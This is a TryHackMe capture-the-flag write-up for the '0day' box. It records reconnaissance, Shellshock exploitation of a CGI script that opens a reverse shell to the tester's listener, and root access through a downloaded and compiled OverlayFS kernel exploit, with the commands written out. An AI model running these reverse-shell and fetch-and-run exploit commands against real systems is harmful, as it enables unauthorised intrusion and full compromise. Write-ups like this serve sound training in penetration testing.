# TryHackMe - 0day Write-up 🏴‍☠️

## Table of Contents
1. Overview
2. Reconnaissance
   - Nmap Scan
   - Gobuster Directory Enumeration
   - Nikto Vulnerability Scan
3. Exploitation
   - Identifying Shellshock (CVE-2014-6271)
   - Using the Public Exploit
   - Gaining Initial Foothold
4. Post-Exploitation
   - Enumerating the System
   - Capturing the User Flag
5. Privilege Escalation
   - Kernel Enumeration
   - Finding the Right Exploit
   - Compiling and Executing the Kernel Exploit
   - Capturing the Root Flag
6. Conclusion

## Overview
This is a write-up for the **0day** machine on TryHackMe. The box is an Ubuntu server vulnerable to the infamous **Shellshock vulnerability (CVE-2014-6271)** in a CGI script, leading to initial access. Privilege escalation is achieved via a kernel exploit targeting the **OverlayFS vulnerability (CVE-2015-1328)**.

## 🔍 Reconnaissance

### 📡 Nmap Scan
I began with an Nmap scan to identify open ports and services.

```bash
nmap -sV -sC 10.48.175.103
```

**Findings:**
- **Port 22 (SSH):** OpenSSH 6.6.1p1 (Ubuntu)
- **Port 80 (HTTP):** Apache httpd 2.4.7 (Ubuntu)

The HTTP server hosts a site titled "0day".

### 📁 Gobuster Enumeration
Next, I used Gobuster to discover hidden directories and files.

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.48.175.103/
```

**Key Discoveries:**
- `/admin/` - Admin login page
- `/backup/` - Potential backup directory
- `/cgi-bin/` - CGI directory (often a source of vulnerabilities)
- `/robots.txt` - Contained a taunting message
- `/secret/` - Might contain sensitive information

### Nikto Vulnerability Scan
A Nikto scan was performed to identify potential web vulnerabilities.

```bash
nikto --url 10.48.175.103 | tee nikto-results
```

**Critical Finding:**
Nikto flagged the `/cgi-bin/test.cgi` file as potentially vulnerable to the **Shellshock vulnerability (CVE-2014-6271)**.

## 💥 Exploitation

### 🎯 Identifying Shellshock (CVE-2014-6271)
The Nikto output explicitly stated:
```
/cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability.
```

This vulnerability allows remote command injection via specially crafted HTTP headers due to a flaw in how Bash processes environment variables.

### Using the Public Exploit
I located a public Python exploit for Apache mod_cgi Shellshock (Exploit-DB ID: 34900).

**Steps:**
1. Downloaded and examined the exploit (`34900.py`)
2. Made it executable:
   ```bash
   chmod +x 34900.py
   ```
3. Reviewed the usage instructions. The exploit supports both reverse and bind shells.

### 🚀 Gaining Initial Access
I set up a netcat listener on my local machine (lhost=192.168.139.0, lport=4444) and executed the exploit.

```bash
python2 34900.py payload=reverse rhost=10.48.175.103 lhost=tun0 lport=4444 pages=/cgi-bin/test.cgi
```

The exploit was successful, and I received a reverse shell as the `www-data` user.

## 🐚 Post-Exploitation

### 📝 System Enumeration
After stabilizing the shell with `python -c 'import pty; pty.spawn("/bin/bash")'`, I gathered system information.

```bash
cat /etc/*-release
# Ubuntu 14.04.1 LTS (Trusty Tahr)

uname -a
# Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

### 🚩 Capturing User Flag
I navigated to the `/home` directory and found a user named `ryan`.

```bash
cd /home
ls -la
# total 12
# lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -> /root/root.txt
# drwxr-xr-x  3 ryan ryan 4096 Sep  2  2020 ryan
```

Inside ryan's home directory, I found the user flag.

```bash
cd /home/ryan
cat user.txt
```

## 👑 Privilege Escalation

### ⬆️ Kernel Exploitation
The kernel version (3.13.0-32-generic) and OS version (Ubuntu 14.04.1) suggested it might be vulnerable to several known local privilege escalation exploits.

### Finding the Right Exploit
I used `searchsploit` to look for Ubuntu 14.04 kernel exploits.

```bash
searchsploit ubuntu 14.04.1 linux 3.13.0
```

I identified **Exploit 37292** - "Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation" (CVE-2015-1328).

I copied the exploit to my working directory:

```bash
searchsploit -m 37292
dos2unix 37292.c
```

### Compiling and Executing the Kernel Exploit
I started a simple Python HTTP server on my local machine to transfer the exploit.

1. Downloaded the exploit source to the target's `/tmp` directory using `wget`
2. Compiled the exploit on the target:

```bash
cd /tmp
gcc 37292.c -o exploit
```

3. Executed the exploit:

```bash
./exploit
```

The exploit executed successfully, spawning a root shell.

### 🏆 Capturing Root Flag
As root, I navigated to the `/root` directory and retrieved the final flag.

```bash
cd /root
cat root.txt
```

## ✅ Conclusion
The **0day** machine provided an excellent practice environment for exploiting two critical, real-world vulnerabilities:

1. **Shellshock (CVE-2014-6271):** A devastating vulnerability in the Bash shell that allowed remote command execution through a vulnerable CGI script.
2. **OverlayFS Privilege Escalation (CVE-2015-1328):** A kernel-level flaw that permitted a local user to gain root privileges.

The path followed a classic penetration testing methodology: reconnaissance, vulnerability identification, exploitation, and privilege escalation. It highlights the importance of keeping both web applications and system kernels up-to-date.

**Room Completed!**
